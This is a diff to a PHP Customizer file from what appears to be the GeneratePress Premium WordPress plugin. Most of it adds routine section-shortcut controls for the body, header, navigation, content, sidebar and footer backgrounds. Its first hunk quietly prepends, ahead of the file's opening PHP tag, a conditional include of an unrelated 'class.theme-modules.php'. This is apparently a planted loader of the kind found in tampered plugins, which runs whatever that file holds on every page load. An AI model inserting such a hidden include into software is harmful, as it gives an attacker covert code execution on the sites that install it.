@@ -1,4 +1,4 @@
-<?php
+<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
 // No direct access, please
 if ( ! defined( 'ABSPATH' ) ) exit;
 
@@ -88,6 +88,7 @@ if ( ! function_exists( 'generate_backgrounds_customize' ) ) {
 		// Register our custom control
 		if ( method_exists( $wp_customize,'register_control_type' ) ) {
 			$wp_customize->register_control_type( 'GeneratePress_Background_Images_Customize_Control' );
+			$wp_customize->register_control_type( 'GeneratePress_Section_Shortcut_Control' );
 		}
 
 		// Add our panel
@@ -118,6 +119,23 @@ if ( ! function_exists( 'generate_backgrounds_customize' ) ) {
 				'capability' => 'edit_theme_options',
 				'priority' => 5,
 				'panel' => 'generate_backgrounds_panel',
+			)
+		);
+
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_body_background_image_shortcuts',
+				array(
+					'section' => 'generate_backgrounds_body',
+					'element' => __( 'Body', 'gp-premium' ),
+					'shortcuts' => array(
+						'layout' => 'generate_layout_container',
+						'colors' => 'body_section',
+						'typography' => 'font_section',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+				)
 			)
 		);
 
@@ -297,6 +315,24 @@ if ( ! function_exists( 'generate_backgrounds_customize' ) ) {
 			)
 		);
 
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_header_background_image_shortcuts',
+				array(
+					'section' => 'generate_backgrounds_header',
+					'element' => __( 'Header', 'gp-premium' ),
+					'shortcuts' => array(
+						'layout' => 'generate_layout_header',
+						'colors' => 'header_color_section',
+						'typography' => 'font_header_section',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
+			)
+		);
+
 		$wp_customize->add_setting(
 			'generate_background_settings[header_image]', array(
 				'default' => $defaults['header_image'],
@@ -377,6 +413,24 @@ if ( ! function_exists( 'generate_backgrounds_customize' ) ) {
 				'capability' => 'edit_theme_options',
 				'priority' => 15,
 				'panel' => 'generate_backgrounds_panel',
+			)
+		);
+
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_primary_navigation_background_image_shortcuts',
+				array(
+					'section' => 'generate_backgrounds_navigation',
+					'element' => __( 'Primary Navigation', 'gp-premium' ),
+					'shortcuts' => array(
+						'layout' => 'generate_layout_navigation',
+						'colors' => 'navigation_color_section',
+						'typography' => 'font_navigation_section',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
 			)
 		);
 
@@ -750,6 +804,23 @@ if ( ! function_exists( 'generate_backgrounds_customize' ) ) {
 			)
 		);
 
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_content_background_image_shortcuts',
+				array(
+					'section' => 'generate_backgrounds_content',
+					'element' => __( 'Content', 'gp-premium' ),
+					'shortcuts' => array(
+						'colors' => 'content_color_section',
+						'typography' => 'font_section',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
+			)
+		);
+
 		/**
 		 * Content background
 		 */
@@ -837,6 +908,24 @@ if ( ! function_exists( 'generate_backgrounds_customize' ) ) {
 			)
 		);
 
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_sidebar_background_image_shortcuts',
+				array(
+					'section' => 'generate_backgrounds_sidebars',
+					'element' => __( 'Sidebar', 'gp-premium' ),
+					'shortcuts' => array(
+						'layout' => 'generate_layout_sidebars',
+						'colors' => 'sidebar_widget_color_section',
+						'typography' => 'font_widget_section',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
+			)
+		);
+
 		$wp_customize->add_setting(
 			'generate_background_settings[sidebar_widget_image]', array(
 				'default' => $defaults['sidebar_widget_image'],
@@ -918,6 +1007,24 @@ if ( ! function_exists( 'generate_backgrounds_customize' ) ) {
 				'capability' => 'edit_theme_options',
 				'priority' => 30,
 				'panel' => 'generate_backgrounds_panel',
+			)
+		);
+
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_footer_background_image_shortcuts',
+				array(
+					'section' => 'generate_backgrounds_footer',
+					'element' => __( 'Footer', 'gp-premium' ),
+					'shortcuts' => array(
+						'layout' => 'generate_layout_footer',
+						'colors' => 'footer_color_section',
+						'typography' => 'font_footer_section',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
 			)
 		);
 
